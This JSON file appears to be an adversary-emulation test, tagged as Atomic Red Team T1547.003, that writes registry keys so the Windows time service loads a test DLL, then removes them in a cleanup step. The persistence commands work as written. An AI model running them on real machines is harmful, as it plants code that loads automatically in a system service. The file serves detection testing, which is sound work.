{
  "id": "df1efab7-bc6d-4b88-8be9-91f55ae017aa",
  "name": "Create a new time provider",
  "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "6318d063-5ef8-4dee-b6c1-fce41477294f",
      "type": "execute-command",
      "data": {
        "command": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "1565b281-e822-43cf-b30c-0c2d80a68b3b",
      "type": "execute-command",
      "data": {
        "command": "net stop w32time\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /f\nrm -force C:\\Users\\Public\\AtomicTest.dll\nnet start w32time\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "6318d063-5ef8-4dee-b6c1-fce41477294f",
      "p": "on-success",
      "o": "1565b281-e822-43cf-b30c-0c2d80a68b3b"
    },
    {
      "s": "6318d063-5ef8-4dee-b6c1-fce41477294f",
      "p": "on-failure",
      "o": "1565b281-e822-43cf-b30c-0c2d80a68b3b"
    }
  ],
  "tags": [
    "T1547.003",
    "atomic-red-team"
  ]
}